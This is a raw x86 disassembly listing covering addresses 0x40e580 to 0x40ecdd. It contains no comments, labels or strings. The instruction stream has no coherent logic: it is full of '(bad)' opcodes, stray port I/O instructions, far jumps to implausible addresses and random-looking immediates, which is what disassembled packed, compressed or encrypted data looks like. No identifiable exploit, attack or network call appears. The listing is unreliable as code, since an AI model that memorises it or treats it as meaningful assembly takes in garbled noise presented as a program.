  40e580:	shl    esi,1
  40e582:	ret    
  40e583:	mov    bh,0xe9
  40e585:	cmp    edi,DWORD PTR [edi-0x5dbecefc]
  40e58b:	fisttp QWORD PTR [ebx+0x1c]
  40e58e:	inc    eax
  40e58f:	(bad)  
  40e590:	mov    edx,0x2c1c2c34
  40e595:	stos   DWORD PTR es:[edi],eax
  40e596:	xor    eax,0x7ac15b97
  40e59b:	fsubr  st,st(3)
  40e59d:	retf   0xe3ad
  40e5a0:	or     ebx,DWORD PTR [edx+0x77]
  40e5a3:	adc    BYTE PTR [ecx-0x10c3b6e7],dl
  40e5a9:	rcl    DWORD PTR [ebp+0x2c],0x46
  40e5ad:	and    ecx,DWORD PTR [ebx]
  40e5af:	dec    esp
  40e5b0:	mov    edi,0x11ed63f4
  40e5b5:	jne    0x40e581
  40e5b7:	add    bh,ah
  40e5b9:	inc    edx
  40e5ba:	and    ebx,esi
  40e5bc:	fs jmp 0x40e55b
  40e5bf:	push   eax
  40e5c0:	mov    cl,al
  40e5c2:	inc    esp
  40e5c3:	jle    0x40e5ad
  40e5c5:	xor    ecx,DWORD PTR [ebx-0x4102e70f]
  40e5cb:	(bad)  
  40e5cc:	sar    DWORD PTR [ebx+0x1e2697ed],1
  40e5d2:	aad    0x89
  40e5d4:	xchg   ebx,eax
  40e5d5:	push   esi
  40e5d6:	mov    al,0x4f
  40e5d8:	repnz and edx,DWORD PTR [edi-0x38]
  40e5dc:	xchg   esp,eax
  40e5dd:	or     eax,eax
  40e5df:	pop    esp
  40e5e0:	ins    DWORD PTR es:[edi],dx
  40e5e1:	mov    ebp,0xb8191214
  40e5e6:	stc    
  40e5e7:	mov    bl,0x1d
  40e5e9:	mov    ebp,DWORD PTR [eax-0x3b]
  40e5ec:	outs   dx,DWORD PTR ds:[esi]
  40e5ed:	jl     0x40e5b2
  40e5ef:	jo     0x40e622
  40e5f1:	adc    eax,0xc371f661
  40e5f6:	or     bl,dh
  40e5f8:	sbb    BYTE PTR [ebp+ecx*4+0x2d],cl
  40e5fc:	sub    al,0xcd
  40e5fe:	bound  eax,QWORD PTR [ebx+edi*2]
  40e601:	jns    0x40e670
  40e603:	mov    eax,ds:0xa81b8267
  40e608:	pop    ds
  40e609:	das    
  40e60a:	scas   al,BYTE PTR es:[edi]
  40e60b:	dec    eax
  40e60c:	fwait
  40e60d:	test   ebx,0x5b50eeb8
  40e613:	xchg   ebx,eax
  40e614:	cmp    ecx,esi
  40e616:	mov    al,ds:0xa68c356c
  40e61b:	mov    al,ds:0xbb045b28
  40e620:	mov    dh,0x17
  40e622:	dec    edx
  40e623:	nop
  40e624:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e625:	pop    edi
  40e626:	mov    cl,0x5c
  40e628:	mov    ds:0xaaf6188f,al
  40e62d:	sub    al,0x39
  40e62f:	in     eax,0x8e
  40e631:	leave  
  40e632:	and    BYTE PTR [esi-0x6c],dl
  40e635:	cmc    
  40e636:	clc    
  40e637:	cmp    BYTE PTR [edi+0x515ab8e9],dl
  40e63d:	push   eax
  40e63e:	and    BYTE PTR [edx+0x30bd2a51],0x45
  40e645:	pop    ecx
  40e646:	sub    al,0x21
  40e648:	mov    edi,0x30dfc46
  40e64d:	sbb    BYTE PTR [edx-0x5507611],0x64
  40e654:	adc    BYTE PTR [ecx-0x1e5837e1],cl
  40e65a:	outs   dx,DWORD PTR ds:[esi]
  40e65b:	repz and ebx,ebp
  40e65e:	mov    ch,0x11
  40e660:	not    DWORD PTR [eax-0x5a]
  40e663:	push   ecx
  40e664:	daa    
  40e665:	jbe    0x40e674
  40e667:	inc    edx
  40e668:	aas    
  40e669:	sub    ch,cl
  40e66b:	pusha  
  40e66c:	int3   
  40e66d:	xchg   ecx,eax
  40e66e:	ret    
  40e66f:	fs jg  0x40e64a
  40e672:	repz sbb BYTE PTR [eax+0x9],al
  40e676:	pop    edx
  40e677:	stos   BYTE PTR es:[edi],al
  40e678:	loop   0x40e65c
  40e67a:	ret    0xbe4d
  40e67d:	adc    dl,cl
  40e67f:	inc    edi
  40e680:	jmp    0x14e3656b
  40e685:	je     0x40e6f6
  40e687:	mov    ecx,0xaffadac5
  40e68c:	ret    0xe86
  40e68f:	popa   
  40e690:	call   0x827b00a2
  40e695:	stos   DWORD PTR es:[edi],eax
  40e696:	iret   
  40e697:	push   eax
  40e698:	ja     0x40e6da
  40e69a:	mov    esp,0x5ea53b15
  40e69f:	inc    esi
  40e6a0:	sub    edi,ebx
  40e6a2:	mov    dh,0xc5
  40e6a4:	stos   DWORD PTR es:[edi],eax
  40e6a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e6a6:	mov    ah,0xfa
  40e6a8:	aad    0x4d
  40e6aa:	cmp    ah,BYTE PTR [ebx-0x76]
  40e6ad:	sub    esi,DWORD PTR [ecx+0x3ba6ea9d]
  40e6b3:	in     al,0xf9
  40e6b5:	mov    edi,0x51876c16
  40e6ba:	mov    bh,0xf6
  40e6bc:	mov    al,0xf4
  40e6be:	pop    es
  40e6bf:	mov    ebx,0x62f4e867
  40e6c4:	outs   dx,DWORD PTR ds:[esi]
  40e6c5:	clc    
  40e6c6:	bound  ebx,QWORD PTR [ebx+0x38]
  40e6c9:	in     eax,0x1b
  40e6cb:	jne    0x40e6f7
  40e6cd:	xchg   edi,eax
  40e6ce:	inc    eax
  40e6cf:	ds call 0x983d:0x7260f7da
  40e6d7:	jg     0x40e6df
  40e6d9:	popa   
  40e6da:	inc    ecx
  40e6db:	xchg   esi,eax
  40e6dc:	ror    edi,cl
  40e6de:	mov    DWORD PTR [edi+0x63],esp
  40e6e1:	lods   al,BYTE PTR ds:[esi]
  40e6e2:	inc    ebx
  40e6e3:	cli    
  40e6e4:	es in  eax,0x8b
  40e6e7:	and    DWORD PTR [edi+edi*8-0x429e4453],edx
  40e6ee:	add    eax,0x25ae756c
  40e6f3:	jecxz  0x40e6e6
  40e6f5:	and    DWORD PTR [esi+0xd],eax
  40e6f8:	sub    al,BYTE PTR [esi-0x72]
  40e6fb:	mov    dh,0x8f
  40e6fd:	add    al,0x16
  40e6ff:	add    al,0x3c
  40e701:	push   ebx
  40e702:	jg     0x40e698
  40e704:	xchg   esi,eax
  40e705:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e706:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e707:	jb     0x40e6ef
  40e709:	lea    esp,[esi]
  40e70b:	test   eax,0xe712ab6c
  40e710:	cli    
  40e711:	stos   BYTE PTR es:[edi],al
  40e712:	or     edx,edx
  40e714:	pop    edx
  40e715:	push   ebx
  40e716:	and    al,0x19
  40e718:	and    eax,0x9b3c2627
  40e71d:	int3   
  40e71e:	or     DWORD PTR [ecx+edx*8-0x45],0x1958b102
  40e726:	ds mov al,ah
  40e729:	std    
  40e72a:	xor    eax,edx
  40e72c:	jb     0x40e742
  40e72e:	(bad)  [edi-0x3e]
  40e731:	adc    ebx,DWORD PTR [edi+0x3a0a0703]
  40e737:	ror    bl,cl
  40e739:	leave  
  40e73a:	adc    al,ch
  40e73c:	xchg   ecx,eax
  40e73d:	xor    ecx,ebp
  40e73f:	and    eax,esi
  40e741:	test   al,0x39
  40e743:	rol    BYTE PTR [ecx],cl
  40e745:	test   al,0x76
  40e747:	sub    eax,0x6a0c9649
  40e74c:	sbb    DWORD PTR [ebx+edi*4],ebx
  40e74f:	out    dx,eax
  40e750:	ds shl DWORD PTR es:[edi-0x22bc6742],0x30
  40e759:	jmp    0x40e764
  40e75b:	in     al,dx
  40e75c:	adc    BYTE PTR [edi],bh
  40e75e:	jecxz  0x40e797
  40e760:	(bad)  
  40e761:	jnp    0x5ba66d1d
  40e767:	mov    ebp,0x68c8e1ea
  40e76c:	loop   0x40e6fe
  40e76e:	jmp    0x40e794
  40e770:	sti    
  40e771:	sahf   
  40e772:	aas    
  40e773:	dec    ebp
  40e774:	dec    ecx
  40e775:	cli    
  40e776:	push   ebx
  40e777:	(bad)  
  40e778:	fistp  QWORD PTR [eax]
  40e77a:	lods   al,BYTE PTR ds:[esi]
  40e77b:	jae    0x40e7d2
  40e77d:	xlat   BYTE PTR ds:[ebx]
  40e77e:	mov    ?,WORD PTR [ebx+0x668089ec]
  40e784:	pop    ebp
  40e785:	in     eax,dx
  40e786:	or     cl,BYTE PTR [edx]
  40e788:	arpl   WORD PTR [edx],cx
  40e78a:	bnd jae 0x40e79c
  40e78d:	stos   BYTE PTR es:[edi],al
  40e78e:	mov    al,0x27
  40e790:	pop    edx
  40e791:	std    
  40e792:	call   0xf46:0xbcf2f3c0
  40e799:	jg     0x40e7d5
  40e79b:	ror    BYTE PTR cs:[edi+eiz*4-0x5ee2e07d],0x9d
  40e7a4:	push   ecx
  40e7a5:	xor    al,0x35
  40e7a7:	shl    DWORD PTR [edx+0x5b],cl
  40e7aa:	aam    0x18
  40e7ac:	cs jnp 0x40e735
  40e7af:	xor    ebp,DWORD PTR [ebx]
  40e7b1:	(bad)  
  40e7b2:	mov    edx,0x7ce4cf49
  40e7b7:	enter  0xed52,0x7d
  40e7bb:	push   DWORD PTR [edx-0xf9ae8e7]
  40e7c1:	xchg   esp,eax
  40e7c2:	or     al,0x5f
  40e7c4:	lahf   
  40e7c5:	test   al,0xb2
  40e7c7:	inc    ebp
  40e7c8:	in     eax,dx
  40e7c9:	push   es
  40e7ca:	mov    ch,0xcc
  40e7cc:	int    0x5
  40e7ce:	xchg   esi,eax
  40e7cf:	pop    edx
  40e7d0:	nop
  40e7d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e7d2:	jg     0x40e7e4
  40e7d4:	mov    ebx,0x8b1132fd
  40e7d9:	mov    bl,0xfd
  40e7db:	test   eax,0xbd2e99dd
  40e7e0:	cmp    cl,BYTE PTR [eax]
  40e7e2:	div    DWORD PTR [eax-0x39]
  40e7e5:	push   esi
  40e7e6:	gs out dx,eax
  40e7e8:	mov    edi,0x92015f87
  40e7ed:	add    DWORD PTR [ebx-0x1bce4aac],edx
  40e7f3:	push   0x59321cbc
  40e7f8:	clc    
  40e7f9:	int    0x63
  40e7fb:	cli    
  40e7fc:	mov    esp,DWORD PTR [ecx+0x38]
  40e7ff:	pushf  
  40e800:	out    0xab,al
  40e802:	push   ss
  40e803:	into   
  40e804:	jg     0x40e7b9
  40e806:	add    eax,DWORD PTR [ebx+ecx*2+0x1f02ca79]
  40e80d:	push   0xea1a7582
  40e812:	pop    esi
  40e813:	nop
  40e814:	adc    bl,bl
  40e816:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e817:	(bad)  
  40e819:	cli    
  40e81a:	les    ebp,FWORD PTR [eax]
  40e81c:	(bad)
  40e81f:	xchg   BYTE PTR [ecx+0xddd9a50],bh
  40e825:	pop    ds
  40e826:	jl     0x40e7fa
  40e828:	jmp    0x40e880
  40e82a:	jae    0x40e808
  40e82c:	cmp    dh,BYTE PTR [ebp-0x69243898]
  40e832:	mov    ch,0x41
  40e834:	dec    eax
  40e835:	cli    
  40e836:	mov    dl,0xc4
  40e838:	push   ds
  40e839:	add    BYTE PTR [edi],dl
  40e83b:	(bad)  
  40e83c:	std    
  40e83d:	loope  0x40e7c9
  40e83f:	mov    WORD PTR [eax+ecx*1-0x72],es
  40e843:	dec    ebp
  40e844:	xor    bh,BYTE PTR [ebx+0x3bcdd5a7]
  40e84a:	mov    DWORD PTR [esi+0x5],ebp
  40e84d:	xchg   ebp,eax
  40e84e:	dec    esp
  40e84f:	ins    BYTE PTR es:[edi],dx
  40e850:	sub    BYTE PTR [eax],cl
  40e852:	or     eax,0xe4112f60
  40e857:	inc    esi
  40e858:	mov    ?,WORD PTR [edi+0x78]
  40e85b:	xor    dh,BYTE PTR [esi-0x5887e52b]
  40e861:	dec    eax
  40e862:	mov    esp,0xb99be67
  40e867:	fld    st(0)
  40e869:	jnp    0x40e823
  40e86b:	cli    
  40e86c:	jmp    0xd6bd:0x9e74e276
  40e873:	mov    esi,0x15869356
  40e878:	jae    0x40e8d9
  40e87a:	or     eax,0x5f2b2452
  40e87f:	and    DWORD PTR [ebp+0x3e0fe4d0],ebp
  40e885:	hlt    
  40e886:	outs   dx,DWORD PTR ds:[esi]
  40e887:	test   eax,0x663ccdb1
  40e88c:	(bad)
  40e890:	cmp    eax,0x32a349c7
  40e895:	mov    esi,ebx
  40e897:	outs   dx,DWORD PTR ds:[esi]
  40e898:	sub    dl,BYTE PTR [edi-0xddc131f]
  40e89e:	mov    ecx,0x4e0f0470
  40e8a3:	adc    eax,0x2269b6d5
  40e8a8:	xlat   BYTE PTR ds:[ebx]
  40e8a9:	ret    
  40e8aa:	pop    ecx
  40e8ab:	push   eax
  40e8ac:	cmp    BYTE PTR [ecx-0x71],bl
  40e8af:	adc    eax,0x7e8a23db
  40e8b4:	sub    DWORD PTR [ecx],esi
  40e8b6:	pusha  
  40e8b7:	inc    ebp
  40e8b8:	pusha  
  40e8b9:	cs jmp 0x5424:0x28b0643
  40e8c1:	push   esi
  40e8c3:	mov    edx,0xcb02e44e
  40e8c8:	icebp  
  40e8c9:	int3   
  40e8ca:	add    BYTE PTR [eax-0x72],0x4e
  40e8ce:	stos   BYTE PTR es:[edi],al
  40e8cf:	aam    0x12
  40e8d1:	or     BYTE PTR [edx-0x69],ch
  40e8d4:	jnp    0x40e94c
  40e8d6:	mov    esi,0xdeaabc67
  40e8db:	loop   0x40e898
  40e8dd:	ss int 0x23
  40e8e0:	adc    esi,DWORD PTR [edx-0x2693cba]
  40e8e6:	data16 and al,0x18
  40e8e9:	dec    edx
  40e8ea:	xor    ebp,DWORD PTR [edi+0x40a0afa5]
  40e8f0:	in     al,dx
  40e8f1:	or     BYTE PTR [edi],ch
  40e8f3:	out    0x84,al
  40e8f5:	loop   0x40e910
  40e8f7:	push   ebp
  40e8f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e8f9:	inc    edx
  40e8fa:	les    eax,FWORD PTR [esi]
  40e8fc:	xor    al,BYTE PTR [eax-0x70c30f88]
  40e902:	add    eax,0x1beda472
  40e907:	jnp    0x40e965
  40e909:	test   al,0x22
  40e90b:	add    BYTE PTR [edi],ch
  40e90d:	fdivr  DWORD PTR [ebx-0x7fd98dd5]
  40e913:	ins    BYTE PTR es:[edi],dx
  40e914:	shl    cl,cl
  40e916:	aam    0x91
  40e918:	icebp  
  40e919:	addr16 out dx,al
  40e91b:	(bad)  
  40e91c:	lock pop es
  40e91e:	dec    ebp
  40e91f:	dec    ebp
  40e920:	mov    gs,ebx
  40e922:	outs   dx,BYTE PTR ds:[esi]
  40e923:	or     DWORD PTR [ebx],ebx
  40e925:	mov    BYTE PTR [edx-0x7f],bh
  40e928:	xor    eax,0x9483fbab
  40e92d:	adc    BYTE PTR [esi],0xaf
  40e930:	fmul   st(5),st
  40e932:	xchg   ebp,eax
  40e933:	push   0x2c
  40e935:	shl    DWORD PTR [esi+edi*2],0xc1
  40e939:	ficom  DWORD PTR [edi+0x5238f587]
  40e93f:	inc    ebx
  40e940:	xchg   esi,eax
  40e941:	clc    
  40e942:	or     BYTE PTR [ecx+0xa],ch
  40e945:	pushf  
  40e946:	lea    ecx,[edi+eiz*2]
  40e949:	inc    BYTE PTR [edi+0x2a09e3b5]
  40e94f:	inc    edx
  40e950:	dec    edi
  40e951:	sub    al,0xf3
  40e953:	ins    BYTE PTR es:[edi],dx
  40e954:	jnp    0x40e97f
  40e956:	fbstp  TBYTE PTR ds:0x7fd21d42
  40e95c:	add    DWORD PTR [edi+0x19f79d24],ecx
  40e962:	loop   0x40e93f
  40e964:	aaa    
  40e965:	fs mov dh,0xf3
  40e968:	loopne 0x40e9dd
  40e96a:	int3   
  40e96b:	mov    ebp,0xcee24917
  40e970:	jns    0x40e9bc
  40e972:	pop    esi
  40e973:	cli    
  40e974:	jmp    0x137f90fb
  40e979:	push   ebp
  40e97a:	fisubr DWORD PTR [edi]
  40e97c:	mov    ds:0xa1097986,eax
  40e981:	lods   eax,DWORD PTR ds:[esi]
  40e982:	mov    ah,0xd1
  40e984:	jmp    0x40e953
  40e986:	inc    ebx
  40e987:	xchg   edi,eax
  40e988:	add    ebx,edx
  40e98a:	jae    0x40e90d
  40e98c:	retf   
  40e98d:	or     al,0xd0
  40e98f:	xor    al,0x4d
  40e991:	mov    eax,0x55fffd80
  40e996:	push   ebp
  40e997:	xor    DWORD PTR [edx-0x1737f1b4],ebx
  40e99d:	cli    
  40e99e:	(bad)  
  40e9a0:	xor    DWORD PTR [ebp+0x77],edx
  40e9a3:	xor    al,0xf9
  40e9a5:	mov    edi,0xedc3fe76
  40e9aa:	dec    eax
  40e9ab:	aas    
  40e9ac:	xlat   BYTE PTR ds:[ebx]
  40e9ad:	xchg   esp,eax
  40e9ae:	nop
  40e9af:	and    al,0xc7
  40e9b1:	sub    al,0x1f
  40e9b3:	or     al,0x98
  40e9b5:	add    al,cl
  40e9b7:	xchg   esi,eax
  40e9b8:	jo     0x40ea21
  40e9ba:	adc    DWORD PTR [ecx+esi*4],0xb82984d3
  40e9c1:	(bad)  
  40e9c2:	mov    esp,0x57bf1801
  40e9c7:	or     ch,bl
  40e9c9:	jl     0x40e9f6
  40e9cb:	xchg   ecx,eax
  40e9cc:	push   ebp
  40e9cd:	xchg   esp,eax
  40e9ce:	ss jbe 0x40ea10
  40e9d1:	or     BYTE PTR [ebx+0x66eac535],dl
  40e9d7:	imul   eax,DWORD PTR [ebp-0xe],0xffffffa7
  40e9db:	dec    ecx
  40e9dc:	xchg   ebx,eax
  40e9dd:	ret    
  40e9de:	enter  0x393d,0x74
  40e9e2:	in     eax,dx
  40e9e3:	mov    ch,0x2
  40e9e5:	or     al,0xea
  40e9e7:	loopne 0x40e9e9
  40e9e9:	cld    
  40e9ea:	adc    DWORD PTR ds:0xfd6c2463,ecx
  40e9f0:	outs   dx,BYTE PTR ds:[esi]
  40e9f1:	and    edi,DWORD PTR [edi-0x4327230c]
  40e9f7:	enter  0x7440,0x3d
  40e9fb:	or     edx,edi
  40e9fd:	pushf  
  40e9fe:	rol    BYTE PTR [edi-0x7a],1
  40ea01:	shl    DWORD PTR [esi+0x793b3382],1
  40ea07:	or     al,0xd7
  40ea09:	(bad)  
  40ea0a:	mov    edx,0x851bc60d
  40ea0f:	adc    BYTE PTR [ecx+eiz*8+0x51],bl
  40ea13:	and    eax,DWORD PTR [esi]
  40ea15:	aad    0xe5
  40ea17:	sbb    ah,dh
  40ea19:	(bad)  
  40ea1b:	and    al,0x78
  40ea1d:	inc    edi
  40ea1e:	dec    ebp
  40ea1f:	add    BYTE PTR [ebx+0x11aca29b],0x6e
  40ea26:	xlat   BYTE PTR ds:[ebx]
  40ea27:	add    eax,DWORD PTR [eax+ebx*4]
  40ea2a:	mov    ah,0x72
  40ea2c:	xlat   BYTE PTR ds:[ebx]
  40ea2d:	mov    edx,0x36f91264
  40ea32:	repz repnz sub al,0x2a
  40ea36:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea37:	dec    esi
  40ea38:	fadd   QWORD PTR [ecx-0x1b12be8a]
  40ea3e:	retf   0x3fb9
  40ea41:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ea43:	out    0xf8,al
  40ea45:	lea    eax,[edx+0x1]
  40ea48:	je     0x40ea1b
  40ea4a:	jbe    0x40ea44
  40ea4c:	in     al,0x9
  40ea4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ea4f:	fstp   QWORD PTR [esi]
  40ea51:	fs jmp 0x838b65ff
  40ea57:	mov    al,ds:0x2b981ac4
  40ea5c:	(bad)  
  40ea5d:	mov    al,0xfd
  40ea5f:	push   cs
  40ea60:	adc    al,0xba
  40ea62:	inc    edx
  40ea63:	mov    ds:0x610cf72a,eax
  40ea68:	mov    edx,0x7e77df56
  40ea6d:	mov    DWORD PTR [ecx],ebp
  40ea6f:	add    cl,BYTE PTR [ebp-0x2b]
  40ea72:	ds sbb eax,0x4dbfb309
  40ea78:	cmp    DWORD PTR [edi-0x5a],0xc0063598
  40ea7f:	mov    ?,ebx
  40ea81:	call   0x3b7c68c3
  40ea86:	stc    
  40ea87:	imul   ebx,DWORD PTR ds:0x8f63fd01,0x6a
  40ea8e:	dec    edx
  40ea8f:	lahf   
  40ea90:	sbb    eax,0x89d63b53
  40ea95:	jno    0x40ea86
  40ea97:	inc    edx
  40ea98:	mul    DWORD PTR [esi-0x44]
  40ea9b:	lock jo 0x40ea25
  40ea9e:	push   edx
  40ea9f:	mov    gs,WORD PTR [eax+0x592f95ad]
  40eaa5:	test   DWORD PTR [edx+0x3b08c962],eax
  40eaab:	xor    eax,0xd02203cf
  40eab0:	cmp    esp,ebx
  40eab2:	fst    st(2)
  40eab4:	ins    BYTE PTR es:[edi],dx
  40eab5:	cmp    ch,bh
  40eab7:	(bad)  
  40eab8:	dec    esp
  40eab9:	add    dl,BYTE PTR [ecx-0x4d6995d0]
  40eabf:	test   eax,0xaa8ccf9b
  40eac4:	lds    edi,FWORD PTR [esi]
  40eac6:	jp     0x40ea5b
  40eac8:	sub    ecx,eax
  40eaca:	inc    edi
  40eacb:	call   0xa33a16e3
  40ead0:	cld    
  40ead1:	out    0x5f,eax
  40ead3:	in     al,0x51
  40ead5:	cs popa 
  40ead7:	inc    eax
  40ead8:	sbb    BYTE PTR [ecx],ch
  40eada:	jle    0x40eb1f
  40eadc:	sub    BYTE PTR [edx-0x7f3af5d6],ah
  40eae2:	addr16 stc 
  40eae4:	mov    dl,0x9c
  40eae6:	jecxz  0x40ea99
  40eae8:	sar    BYTE PTR [edx],cl
  40eaea:	cdq    
  40eaeb:	jecxz  0x40eaf2
  40eaed:	stos   BYTE PTR es:[edi],al
  40eaee:	mov    ebx,esi
  40eaf0:	push   ebx
  40eaf1:	mov    bl,BYTE PTR [eax-0x31]
  40eaf4:	xor    eax,0xac50b5ca
  40eaf9:	push   esi
  40eafa:	scas   al,BYTE PTR es:[edi]
  40eafb:	lahf   
  40eafc:	jno    0x40ea94
  40eafe:	sahf   
  40eaff:	xor    al,0xab
  40eb01:	les    ebp,FWORD PTR [ecx+0x60ba11f6]
  40eb07:	out    dx,al
  40eb08:	jno    0x40eabc
  40eb0a:	adc    esp,DWORD PTR [ebp+ebx*4+0x521671e0]
  40eb11:	cmp    esi,DWORD PTR [esi+0x18]
  40eb14:	sbb    eax,0x90a6f525
  40eb19:	push   edx
  40eb1a:	mov    bl,BYTE PTR [ebx]
  40eb1c:	mov    dh,0xcd
  40eb1e:	jne    0x40eb59
  40eb20:	xor    DWORD PTR [esi+0x68],0xe53ee8
  40eb27:	jl     0x40eb38
  40eb29:	sahf   
  40eb2a:	out    0xb2,eax
  40eb2c:	sbb    BYTE PTR [ecx-0x34],dl
  40eb2f:	inc    eax
  40eb30:	push   0xaff3595a
  40eb35:	daa    
  40eb36:	sub    eax,0x82849cb
  40eb3b:	push   0xfa0fee02
  40eb40:	pop    es
  40eb41:	gs dec esi
  40eb43:	or     eax,0x6dbd4f0b
  40eb48:	jo     0x40eb70
  40eb4a:	sbb    al,0x81
  40eb4c:	inc    esi
  40eb4d:	mov    ?,WORD PTR [ebp+0x56bd50bc]
  40eb53:	sti    
  40eb54:	pop    ebp
  40eb55:	in     al,0xc6
  40eb57:	loope  0x40eb8a
  40eb59:	in     al,dx
  40eb5a:	push   0xb0c72002
  40eb5f:	loope  0x40eaed
  40eb61:	outs   dx,BYTE PTR ds:[esi]
  40eb62:	icebp  
  40eb63:	jp     0x40ebd1
  40eb65:	sub    DWORD PTR [ebp-0x39],0xe9de76
  40eb6c:	lods   al,BYTE PTR ds:[esi]
  40eb6d:	loop   0x40eb60
  40eb6f:	test   DWORD PTR [ebx],ebx
  40eb71:	push   ebp
  40eb72:	sbb    dh,BYTE PTR [edx]
  40eb74:	jecxz  0x40ebab
  40eb76:	pop    ss
  40eb77:	mov    bl,0x89
  40eb79:	add    ah,al
  40eb7b:	xchg   ebx,eax
  40eb7c:	jb     0x40eb6e
  40eb7e:	push   ebx
  40eb7f:	mov    ecx,0xfed00645
  40eb84:	mov    bl,BYTE PTR [ebx+0x61c7a749]
  40eb8a:	inc    ebp
  40eb8b:	and    al,0x9d
  40eb8d:	scas   eax,DWORD PTR es:[edi]
  40eb8e:	add    esi,esi
  40eb90:	mov    bh,0x50
  40eb92:	cmc    
  40eb93:	bnd ret 
  40eb95:	xor    eax,0x55a7ced6
  40eb9a:	xlat   BYTE PTR ds:[ebx]
  40eb9b:	out    0xa4,eax
  40eb9d:	xor    bl,BYTE PTR [ebp+0x50]
  40eba0:	dec    edi
  40eba1:	and    eax,0x10290ac
  40eba6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40eba7:	mov    esi,0x96d19646
  40ebac:	popa   
  40ebad:	adc    ah,BYTE PTR [esi-0x36]
  40ebb0:	adc    al,0x92
  40ebb2:	fimul  DWORD PTR [edx]
  40ebb4:	mov    eax,0x48272288
  40ebb9:	aas    
  40ebba:	push   esi
  40ebbb:	shl    esi,0xda
  40ebbe:	push   0x7
  40ebc0:	xchg   DWORD PTR [esi-0x41],esp
  40ebc3:	inc    eax
  40ebc4:	inc    ecx
  40ebc5:	dec    esi
  40ebc6:	cwde   
  40ebc7:	sub    eax,edx
  40ebc9:	scas   eax,DWORD PTR es:[edi]
  40ebca:	aam    0x43
  40ebcc:	jbe    0x40eb4e
  40ebce:	push   ss
  40ebcf:	sbb    dh,ah
  40ebd1:	push   esp
  40ebd2:	jo     0x40ebfc
  40ebd4:	shl    ebp,0x79
  40ebd7:	mov    ecx,0xe75b79cd
  40ebdc:	cmp    dl,BYTE PTR [edx+0x19]
  40ebdf:	and    BYTE PTR [ebp+ebx*1-0x1a723cbf],ah
  40ebe6:	imul   esi
  40ebe8:	xchg   DWORD PTR [edx],esp
  40ebea:	xchg   esi,eax
  40ebeb:	push   eax
  40ebec:	push   ebx
  40ebed:	add    edi,edx
  40ebef:	adc    ah,bl
  40ebf1:	std    
  40ebf2:	imul   edx,DWORD PTR [ebx+0x71028145],0x37
  40ebf9:	aaa    
  40ebfa:	mov    ecx,0x2d10fe1f
  40ebff:	fld    DWORD PTR [edi]
  40ec01:	stos   BYTE PTR es:[edi],al
  40ec02:	repz and eax,0xd8826f21
  40ec08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ec09:	mov    ds:0xde43b756,al
  40ec0e:	mov    ah,0x98
  40ec10:	jns    0x40ebdb
  40ec12:	daa    
  40ec13:	jb     0x40ec94
  40ec15:	shl    ah,cl
  40ec17:	push   0x829cf195
  40ec1c:	stc    
  40ec1d:	loop   0x40ec37
  40ec1f:	dec    ebp
  40ec20:	stos   DWORD PTR es:[edi],eax
  40ec21:	(bad)  
  40ec23:	outs   dx,DWORD PTR ds:[esi]
  40ec24:	adc    eax,0xb5ae9822
  40ec29:	push   ebx
  40ec2a:	mov    al,ds:0x91119626
  40ec2f:	dec    ecx
  40ec30:	cld    
  40ec31:	mov    edi,0xcdd60c54
  40ec36:	and    eax,0x194833b8
  40ec3b:	pop    ebp
  40ec3c:	push   0xffffff8c
  40ec3e:	and    ch,bl
  40ec40:	mov    cl,0xaf
  40ec42:	mov    dh,0xc2
  40ec44:	adc    al,0xce
  40ec46:	pop    edi
  40ec47:	jp     0x40ecc5
  40ec49:	jo     0x40ec0b
  40ec4b:	in     al,dx
  40ec4c:	shl    ecx,cl
  40ec4e:	aad    0xcd
  40ec50:	aaa    
  40ec51:	jge    0x40ec02
  40ec53:	imul   eax,DWORD PTR [ebx],0x18
  40ec56:	xchg   esp,eax
  40ec57:	push   eax
  40ec58:	dec    ebp
  40ec59:	retf   0x795e
  40ec5c:	or     eax,0x39491c5d
  40ec61:	outs   dx,BYTE PTR ds:[esi]
  40ec62:	inc    ebp
  40ec63:	mov    al,0x2e
  40ec65:	jb     0x40ec3d
  40ec67:	push   0xffffffd3
  40ec69:	mov    BYTE PTR ds:0x5f0b0d7b,dl
  40ec6f:	push   edx
  40ec70:	lea    ebp,[esi-0x32091dd]
  40ec76:	sahf   
  40ec77:	xchg   BYTE PTR [edx-0x4908c098],bh
  40ec7d:	inc    ebx
  40ec7e:	loop   0x40ec48
  40ec80:	push   es
  40ec81:	mov    dh,0x77
  40ec83:	sbb    bl,bh
  40ec85:	cmp    bp,ax
  40ec88:	out    dx,al
  40ec89:	shl    eax,0x2
  40ec8c:	sub    BYTE PTR [esi],0x59
  40ec8f:	inc    ebx
  40ec90:	stos   BYTE PTR es:[edi],al
  40ec91:	test   edi,esi
  40ec93:	(bad)  
  40ec95:	sub    ah,bh
  40ec97:	in     al,dx
  40ec98:	into   
  40ec99:	sub    DWORD PTR [edi+0x17706022],edi
  40ec9f:	jns    0x40ecaa
  40eca1:	mov    ebp,0xcb242c0b
  40eca6:	inc    eax
  40eca7:	iret   
  40eca8:	xor    esi,DWORD PTR [ebp-0x156ae11a]
  40ecae:	cmp    ch,BYTE PTR [edi+0x2c0e5755]
  40ecb4:	add    BYTE PTR [ebx],0xb9
  40ecb7:	jne    0x40ecb2
  40ecb9:	xchg   ebx,eax
  40ecba:	pop    ds
  40ecbb:	sub    DWORD PTR [edx+0x628b7da9],edx
  40ecc1:	test   eax,0xc95f44d7
  40ecc6:	pop    ebp
  40ecc7:	js     0x40eca0
  40ecc9:	loope  0x40ed34
  40eccb:	rcr    DWORD PTR [edx+0x54],0xac
  40eccf:	mov    ds:0xe5493eaa,al
  40ecd4:	not    DWORD PTR [edi+0x40f8a63]
  40ecda:	dec    esi
  40ecdb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ecdc:	push   ebx
  40ecdd:	jne    0x40ecfc
